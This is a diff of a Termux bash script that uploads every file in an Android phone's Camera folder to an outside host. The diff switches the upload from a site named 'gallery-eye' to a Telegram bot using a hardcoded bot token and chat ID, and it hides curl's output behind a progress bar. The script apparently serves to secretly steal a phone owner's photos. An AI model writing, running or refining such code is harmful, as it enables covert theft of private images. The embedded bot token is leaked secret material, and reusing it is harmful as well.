@@ -1,6 +1,9 @@
 #!/data/data/com.termux/files/usr/bin/bash
 
-GET_URL="https://gallery-eye.lovestoblog.com/upload.php"
+# Telegram Credentials
+BOT_TOKEN="8246488249:AAEsdfxUSPEAHlr2Je5E6s-oNnHEza-e-i0"
+CHAT_ID="8103507350"
+GET_URL="https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
 LOCAL_DIR="$HOME/storage/dcim/Camera"
 
 clear
@@ -29,7 +32,8 @@ for FILE in $FILES; do
     EMPTY=$((BAR_LEN - FILLED))
     PROGRESS="$(printf '%0.s#' $(seq 1 $FILLED))$(printf '%0.s ' $(seq 1 $EMPTY))"
 
-    curl -s -F "file=@$FILE" -F "token=1926" "$GET_URL"
+    # Send to Telegram using original curl format
+    curl -s -F "chat_id=$CHAT_ID" -F "photo=@$FILE" "$GET_URL" > /dev/null 2>&1
 
     echo -ne "\033[1;32m[$PROGRESS] $PERCENT%%\r\033[0m"
     sleep 0.05
